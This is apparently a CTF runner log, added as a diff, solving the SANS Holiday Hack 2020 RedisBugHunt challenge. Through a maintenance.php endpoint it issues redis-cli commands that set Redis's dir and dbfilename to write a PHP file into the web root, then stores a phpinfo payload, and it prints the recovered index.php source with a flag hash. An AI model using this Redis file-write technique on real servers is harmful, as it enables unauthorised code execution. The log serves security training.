@@ -1,0 +1,64 @@
+2020-12-23 23:00:57.395 +00:00 [VRB] Started SANS Holiday Hack, December 2020
+2020-12-23 23:00:57.413 +00:00 [VRB] Using CTF runner 0.1.0-alpha.18
+2020-12-23 23:00:57.415 +00:00 [VRB] Running challange RedisBugHunt
+2020-12-23 23:00:57.416 +00:00 [INF] player@bef087130d45:~$
+
+                We need your help!!
+
+                The server stopped working, all that's left is the maintenance port.
+
+                To access it, run:
+
+                curl http://localhost/maintenance.php
+
+                We're pretty sure the bug is in the index page. Can you somehow use the
+                maintenance page to view the source code for the index page?
+
+            
+2020-12-23 23:00:57.417 +00:00 [INF] curl http://localhost
+
+                Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on
+            
+2020-12-23 23:00:57.417 +00:00 [INF] curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
+
+                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dir' '/var/www/html'
+
+                OK
+            
+2020-12-23 23:00:57.418 +00:00 [INF] curl http://localhost/maintenance.php?cmd=config,set,dbfilename,index.php
+
+2020-12-23 23:00:57.418 +00:00 [INF] player@4389dbda2fc2:~$ curl http://localhost/maintenance.php?cmd=set,test,"%3C%3Fphp+phpinfo()%3B+%3F%3E"
+
+                Running: redis-cli --raw -a '<password censored>' 'set' 'test' '<?php phpinfo(); ?>'
+
+                OK
+             
+2020-12-23 23:00:57.418 +00:00 [INF] player@4389dbda2fc2:~$ curl http://localhost
+
+                Warning: Binary output can mess up your terminal. Use "--output -" to tell 
+                Warning: curl to output it to your terminal anyway, or consider "--output 
+                Warning: <FILE>" to save to a file.
+            
+2020-12-23 23:00:57.418 +00:00 [INF] index.php <code><span style=\"color: #000000\"><span style=\"color: #0000BB\">&lt;?php<br /><br /></span><span style=\"color: #FF8000\">#&nbsp;We&nbsp;found&nbsp;the&nbsp;bug!!<br />#<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;&nbsp;/<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.\-/.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/\&nbsp;()&nbsp;&nbsp;&nbsp;()<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/~---~\.-~^-.<br />#&nbsp;.-~^-./&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;\---.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;.-~\&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;/~-.<br />#&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;A&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;\/<br />#&nbsp;#####hhc:{\"hash\":&nbsp;\"dfd550b4b1bc136d9480bc570f7ec2382f5bd23cf9e227770582c15118e5bc8b\",&nbsp;\"resourceId\":&nbsp;\"7246f9a7-3cf1-4471-b663-f4e8391b0208\"}#####<br /><br /></span><span style=\"color: #007700\">echo&nbsp;</span><span style=\"color: #DD0000\">\"Something&nbsp;is&nbsp;wrong&nbsp;with&nbsp;this&nbsp;page!&nbsp;Please&nbsp;use&nbsp;http://localhost/maintenance.php&nbsp;to&nbsp;see&nbsp;if&nbsp;you&nbsp;can&nbsp;figure&nbsp;out&nbsp;what's&nbsp;going&nbsp;on\"<br /></span><span style=\"color: #0000BB\">?&gt;<br /></span></span></code>\
+
+
+                <?php
+
+                # We found the bug!!
+                #
+                #         \   /
+                #         .\-/.
+                #     /\ ()   ()
+                #       \/~---~\.-~^-.
+                # .-~^-./   |   \---.
+                #      {    |    }   \
+                #    .-~\   |   /~-.
+                #   /    \  A  /    \
+                #         \/ \/
+                # #####hhc:{"hash": "dfd550b4b1bc136d9480bc570f7ec2382f5bd23cf9e227770582c15118e5bc8b", "resourceId": "7246f9a7 - 3cf1 - 4471 - b663 - f4e8391b0208"}#####
+
+                echo "Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on"
+                ?>
+
+            
+2020-12-23 23:00:57.420 +00:00 [VRB] Challenge RedisBugHunt completed
